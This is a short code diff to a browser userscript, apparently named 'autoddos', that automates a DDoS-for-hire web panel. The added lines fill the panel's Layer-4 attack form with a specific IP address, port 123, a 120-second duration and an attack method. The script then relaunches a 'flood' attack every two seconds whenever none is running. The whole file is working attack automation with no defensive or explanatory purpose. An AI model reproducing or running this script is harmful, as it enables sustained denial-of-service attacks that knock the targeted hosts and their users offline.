@@ -10,7 +10,11 @@
 // ==/UserScript==
 
 var autoddos = setInterval(function (){
+    document.getElementById("hostL4").value = "103.222.255.36";
+    document.getElementById("portL4").value = "123";
+    document.getElementById("timeL4").value = "120";
+    document.getElementById("methodL4").selectedIndex = 1;
     if(document.getElementById("attacksinprogress").textContent.length == 0){
-        L4btn('flood', '')
+        L4btn('flood', '');
     }
 },2000)
